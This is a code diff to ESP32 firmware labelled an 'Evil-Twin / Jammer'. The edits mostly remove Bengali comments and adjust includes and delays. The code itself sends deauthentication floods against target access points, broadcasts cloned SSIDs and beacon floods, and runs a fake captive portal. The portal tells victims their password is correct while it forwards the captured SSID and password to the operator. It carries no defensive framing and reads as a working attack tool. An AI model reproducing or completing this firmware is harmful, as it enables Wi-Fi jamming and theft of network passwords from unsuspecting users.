@@ -1,10 +1,10 @@
 /* =========================================================
-   ESP32 Evil-Twin / Jammer  v6 — live status + safe control
+   ESP32 Evil-Twin / Jammer  v6.1 — Cleaned & Fixed
    ========================================================= */
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
-#include <esp_rom_delay.h>
+#include <esp_wifi.h>
 
 #define CTRL_SSID "JAM-CTL"
 #define CTRL_PASS "jammer1234"
@@ -32,7 +32,6 @@ uint8_t apCh = 1, apMac[6]; uint16_t seqNo = 0;
 
 WebServer web(80); DNSServer dns; WiFiServer ctl(CTRL_PORT); WiFiClient ctlClient;
 
-/* ---------- ইভেন্ট কিউ (লিংক গেলেও আপডেট হারায় না) ---------- */
 char qbuf[QN][100]; volatile uint8_t qh = 0, qt = 0;
 void flushQ() {
   while (qt != qh && ctlClient && ctlClient.connected()) {
@@ -48,7 +47,6 @@ void ev(const String &s) {
   if (ctlClient && ctlClient.connected()) flushQ();
 }
 
-/* ---------- AP নাম বদল: রিস্টার্ট ছাড়া ---------- */
 void apSetSSID(const char *ssid) {
   wifi_config_t cfg;
   if (esp_wifi_get_config(WIFI_IF_AP, &cfg) != ESP_OK) { WiFi.softAP(ssid, NULL, apCh, 0, AP_MAXCONN); return; }
@@ -64,7 +62,6 @@ void apSetSSID(const char *ssid) {
   WiFi.setSleep(false);
 }
 
-/* ---------- এনক্রিপশন ক্লাসিফিকেশন ---------- */
 const char *encName(uint8_t e) {
   switch (e) {
     case 0: return "OPEN";   case 1: return "WEP";
@@ -74,7 +71,7 @@ const char *encName(uint8_t e) {
     default: return "?";
   }
 }
-const char *diffTag(uint8_t e) {      // EASY / GOOD / MIXED / HARD
+const char *diffTag(uint8_t e) {
   if (e <= 1) return "EASY";
   if (e <= 4) return "GOOD";
   if (e == 7) return "MIXED";
@@ -102,7 +99,6 @@ int mkBeacon(uint8_t *b, const uint8_t *bs, const char *ss, uint8_t sl, uint8_t 
   return p;
 }
 
-/* ---------- ক্লায়েন্ট ট্র্যাকিং ---------- */
 int cliFind(const uint8_t *m) {
   for (int i = 0; i < cliN; i++) if (!memcmp(cli[i].mac, m, 6)) return i;
   return -1;
@@ -113,7 +109,6 @@ void cliTouch(const uint8_t *m, uint8_t t) {
   cli[i].last = millis(); cli[i].down = false;
 }
 
-/* ---------- sniffer ---------- */
 IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
   if (!attacking || hold) return;
   const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
@@ -158,7 +153,6 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
   }
 }
 
-/* ---------- flood ---------- */
 void attackTask(void *) {
   uint8_t bf[100], f[26]; uint16_t c = 0;
   const uint8_t bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
@@ -167,7 +161,7 @@ void attackTask(void *) {
     if (!attacking || hold || tcount == 0) { vTaskDelay(50 / portTICK_PERIOD_MS); continue; }
     for (int i = 0; i < tcount; i++) {
       mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 7);
-      for (int k = 0; k < 3; k++) { esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false); ets_delay_us(90); }
+      for (int k = 0; k < 3; k++) { esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false); delayMicroseconds(90); }
       vTaskDelay(2 / portTICK_PERIOD_MS);
     }
     if (bfloodOn) {
@@ -192,7 +186,6 @@ void attackTask(void *) {
   }
 }
 
-/* ---------- স্ট্যাটাস রিপোর্টার ---------- */
 void statusTask(void *) {
   int lastDown = -1;
   while (true) {
@@ -280,9 +273,9 @@ void handleSubmit() {
     ev("EV DONE " + ssid + " " + pw);
     web.send(200, "text/html", page(ssid, "<p style='color:#3fb950'>✔ পাসওয়ার্ড সঠিক — কানেক্টেড</p>"));
     vTaskDelay(1500 / portTICK_PERIOD_MS);
-    hardStop();                       // jam off + fake wifi off
+    hardStop();
     vTaskDelay(2500 / portTICK_PERIOD_MS);
-    backToCtrl();                     // কন্ট্রোল AP ফিরে আসে, কিউ ফ্লাশ হয়
+    backToCtrl();
     flushQ();
   } else {
     apSetSSID(tg[idx].ssid);
@@ -323,7 +316,7 @@ void handleCmd(String line) {
   if (line.startsWith("DUP ")) { dupCount = constrain(line.substring(4).toInt(), 0, 40); ev("EV DUP " + String(dupCount)); return; }
   if (line == "STOP") { hardStop(); vTaskDelay(1200); backToCtrl(); hold = false; ev("EV STOPPED"); return; }
 
-  if (line.startsWith("PREP ")) {                 // চ্যানেল বদল — নাম অপরিবর্তিত, ফোন নিজেই ফিরবে
+  if (line.startsWith("PREP ")) {
     int idx = line.substring(5).toInt();
     if (idx < 0 || idx >= scanCount) { ev("EV ERR idx"); return; }
     apCh = scanList[idx].ch;
@@ -352,7 +345,7 @@ void handleCmd(String line) {
     cliN = 0; rotIdx = 0; assocIdx = 0; rotOn = (tcount > 1);
     esp_wifi_set_max_tx_power(78);
     esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
-    apSetSSID(tg[0].ssid);                       // রিস্টার্ট ছাড়া রিনেম
+    apSetSSID(tg[0].ssid);
 
     wifi_promiscuous_filter_t fl = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
     esp_wifi_set_promiscuous_filter(&fl);
